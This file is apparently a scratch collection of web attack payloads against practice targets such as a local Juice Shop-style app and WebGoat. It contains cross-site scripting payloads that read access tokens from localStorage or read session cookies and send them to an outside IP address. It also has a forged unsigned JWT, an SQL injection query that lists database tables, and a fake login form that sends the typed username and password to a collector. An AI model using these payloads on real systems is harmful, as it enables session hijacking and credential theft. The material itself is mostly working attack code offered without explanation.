var x = window.localStorage.getItem("adal.access.token.keyfea922e0-f20b-4038-bc96-aa7be62c6e2e");var xhttp = new XMLHttpRequest();xhttp.open("GET", "http://104.40.75.104:8000/1ds8c7n1?token="+x, false);xhttp.send();

http://localhost:4200/bypass?name=%3Ciframe%20src%3Djavascript:alert(window.localStorage.getItem(%22adal.access.token.keyfea922e0-f20b-4038-bc96-aa7be62c6e2e%22))%3E%3Cp%3ERafael%3C%2Fp%3E%3C%2Fiframe%3E

http://localhost:4200/bypass?name=<iframe src=javascript:var x = window.localStorage.getItem("adal.access.token.keyfea922e0-f20b-4038-bc96-aa7be62c6e2e");alert(x);window.open("http://104.40.75.104:8000/1ds8c7n1%3Ftoken="+window.localStorage.getItem('adal.access.token.keyfea922e0-f20b-4038-bc96-aa7be62c6e2e'))></iframe>

<iframe 
  
  src=javascript:var x = window.localStorage.getItem('adal.access.token.keyfea922e0-f20b-4038-bc96-aa7be62c6e2e');
  var xhttp = new XMLHttpRequest();
  xhttp.open("GET", "http://104.40.75.104:8000/1ds8c7n1%3Ftoken="+x, false);
  xhttp.send();

</iframe>

http://localhost:4200/bypass?name=%3Ciframe%20src%3Djavascript:window.location.href%3D%27http:%2F%2F104.40.75.104:8000%2F1ds8c7n1%3Ftoken%3D%27%2Bwindow.localStorage.getItem(%22adal.access.token.keyfea922e0-f20b-4038-bc96-aa7be62c6e2e%22)%3E%3C%2Fiframe%3E

<script>
  var xhttp = new XMLHttpRequest();
  xhttp.open("GET", "http://104.40.75.104:8000/1mvpm171?cookie="+document.cookie, false);
  xhttp.send();
</script>

http://localhost:3000/#/search?q=%3Cscript%3Evar%20xhttp%20%3D%20new%20XMLHttpRequest();xhttp.open(%22GET%22,%20%22http:%2F%2F104.40.75.104:8000%2F1mvpm171%3Fcookie%3D%22%2Bdocument.cookie,%20false);xhttp.send();%3C%2Fscript%3E

{
  "alg": "none",
  "typ": "JWT"
}

{
  "status": "success",
  "data": {
    "id": 1,
    "email": "bjoern.kimminich@googlemail.com",
    "password": "0192023a7bbd73250516f069df18b500",
    "createdAt": "2018-08-03 16:25:49.746 +00:00",
    "updatedAt": "2018-08-03 16:25:49.746 +00:00"
  },
  "iat": 1533614519,
  "exp": 1533632519
}

ewogICJhbGciOiAibm9uZSIsCiAgInR5cCI6ICJKV1QiCn0.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwiZW1haWwiOiJiam9lcm4ua2ltbWluaWNoQGdvb2dsZW1haWwuY29tIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsImNyZWF0ZWRBdCI6IjIwMTgtMDgtMTQgMDU6MDg6MjcuMTc5ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMTgtMDgtMTQgMDU6MDg6MjcuMTc5ICswMDowMCJ9LCJpYXQiOjE1MzQyMjUwNjMsImV4cCI6MTUzNDI0MzA2M30


eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwiZW1haWwiOiJiam9lcm4ua2ltbWluaWNoQGdvb2dsZW1haWwuY29tIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsImNyZWF0ZWRBdCI6IjIwMTgtMDgtMTQgMDU6MDg6MjcuMTc5ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMTgtMDgtMTQgMDU6MDg6MjcuMTc5ICswMDowMCJ9LCJpYXQiOjE1MzQyMjUwNjMsImV4cCI6MTUzNDI0MzA2M30

YmpvZXJuLmtpbW1pbmljaEBnb29nbGVtYWlsLmNvbQ==


SELECT name FROM (SELECT * FROM sqlite_master UNION ALL SELECT * FROM sqlite_temp_master) WHERE type='table' ORDER BY name

</form>
  <script>
    function hack(){ 
      XSSImage=new Image; 
      XSSImage.src="http://localhost:8080/WebGoat/catcher?PROPERTY=yes&user="+ document.phish.user.value + "&password=" + document.phish.pass.value + ""; 
  </script>
  
  <form name="phish">
  <br><br>
  <HR>
  <H3>This feature requires account login:</H3 >
  <br><br>Enter Username:<br>
  <input type="text" name="user">
  <br>Enter Password:<br>
  <input type="password" name = "pass">
  <br><input type="submit" name="login" value="login" onclick="hack()">
  </form>
  <br><br>
  <HR>